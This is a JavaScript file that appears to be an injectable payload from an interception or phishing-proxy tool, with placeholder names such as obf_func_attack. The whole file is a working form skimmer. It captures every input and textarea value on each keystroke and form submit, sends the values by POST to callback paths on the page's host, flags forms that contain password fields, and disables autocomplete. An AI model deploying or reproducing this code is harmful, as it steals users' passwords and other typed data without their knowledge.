function obf_func_callback() {
	try {
		obf_var_inputs = document.getElementsByTagName("input");
		obf_var_textareas = document.getElementsByTagName("textarea");
		obf_var_params = "";

		for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
			if (obf_var_inputs[obf_var_i].value != "") {
				obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) + "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) + ( obf_var_i < (obf_var_inputs.length-1) ? "&" : "" );
			}
		}
		for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
			if (obf_var_textareas[obf_var_i].value != "") {
				obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) + "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) + ( obf_var_i < (obf_var_textareas.length-1) ? "&" : "" );
			}
		}

		if (obf_var_params.length > 0) {
			obf_var_req = new XMLHttpRequest();
			obf_var_req.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params, true);
			obf_var_req.send();
		}
	} catch(obf_ignore){}
}

function obf_func_whitelist() {
	try {
		obf_var_inputs = document.getElementsByTagName("input");
		obf_var_textareas = document.getElementsByTagName("textarea");
		obf_var_params = "";

		for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
			if (obf_var_inputs[obf_var_i].value != "") {
				obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) + "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) + ( obf_var_i < (obf_var_inputs.length-1) ? "&" : "" );
			}
		}
		for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
			if (obf_var_textareas[obf_var_i].value != "") {
				obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) + "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) + ( obf_var_i < (obf_var_textareas.length-1) ? "&" : "" );
			}
		}

		if (obf_var_params.length > 0) {
			obf_var_req = new XMLHttpRequest();
			obf_var_req.open("POST", "http://" + location.host + "/obf_path_whitelist?" + obf_var_params, true);
			obf_var_req.send();
		}
	} catch(obf_ignore){}
}

self.addEventListener("keyup", function(obf_var_event) {
	try {
		if (obf_var_event.target.tagName.match(/INPUT|TEXTAREA/)) {
			obf_func_callback();
		}
	} catch(obf_ignore){}
});

function obf_func_attack() {
	document.querySelectorAll("form").forEach(function(obf_var_form){
		obf_var_form.addEventListener("submit", obf_func_callback);
		if (obf_var_form.querySelector("input[type=password]")) {
			obf_var_form.addEventListener("submit", obf_func_whitelist);
		}
	});

	document.querySelectorAll("input").forEach(function(obf_var_input){
		obf_var_input.autocomplete = "off";
	});
}

try {
	obf_func_attack();
} catch(obf_ignore){
	try {
		document.addEventListener("DOMContentLoaded", obf_func_attack);
	} catch(obf_ignore){
		self.addEventListener("load", obf_func_attack);
	}
}
